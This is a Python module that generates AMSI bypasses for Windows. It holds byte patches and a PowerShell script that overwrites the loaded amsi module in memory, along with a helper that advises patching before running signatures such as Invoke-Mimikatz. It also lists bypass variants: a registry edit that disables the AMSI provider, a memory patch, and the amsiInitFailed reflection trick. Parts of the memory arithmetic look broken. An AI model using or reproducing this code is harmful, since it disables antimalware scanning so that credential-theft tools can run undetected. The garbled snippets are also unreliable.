import base64


AMSI_PATCH_AMSI64 = (
    b"\x48\x31\xC0"           # xor rax, rax
    b"\xC3"                    # ret
)

AMSI_PATCH_AMSI32 = (
    b"\x31\xC0"                # xor eax, eax
    b"\xC2\x18\x00"            # ret 0x18
)


def amsi_patch_script(arch: str = "x64") -> str:
    patch = AMSI_PATCH_AMSI64 if arch == "x64" else AMSI_PATCH_AMSI32
    b64 = base64.b64encode(patch).decode()

    return f'''$patch = [System.Convert]::FromBase64String("{b64}")
$proc = Get-Process -Id $pid
$mod = $proc.Modules | Where-Object {{$_.ModuleName -like "amsi*"}}
if (-not $mod) {{ return }}
$addr = $mod.BaseAddress
$va = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($addr + 0x18)
$vSize = [System.Runtime.InteropServices.Marshal]::ReadInt32($addr + 0x30)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $va + 0x10, $patch.Length)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $va + 4, $patch.Length)
'''


def amsi_trigger_scan(signature: str = "Invoke-Mimikatz") -> dict:
    return {
        "technique": "AMSI trigger scan",
        "signature": signature,
        "detected": False,
        "note": "Use amsi_patch_script() before triggering known signatures"
    }


AMSI_BYPASS_VARIANTS = [
    ("Registry disable",
     'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers" '
     '-Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Value ""'),
    ("Memory patch (x64)",
     '$a=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x1000);'
     '[System.Runtime.InteropServices.Marshal]::Copy(@(0x48,0x31,0xC0,0xC3),0,$a,4);'
     '$p=[System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate('
     '[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer('
     '(Get-Process -Id $pid).Modules[0].BaseAddress, [Type]))'),
    ("COM hijack",
     '[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")'
     '.Assembly.GetType("System.Management.Automation.AmsiUtils")'
     '.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'),
]
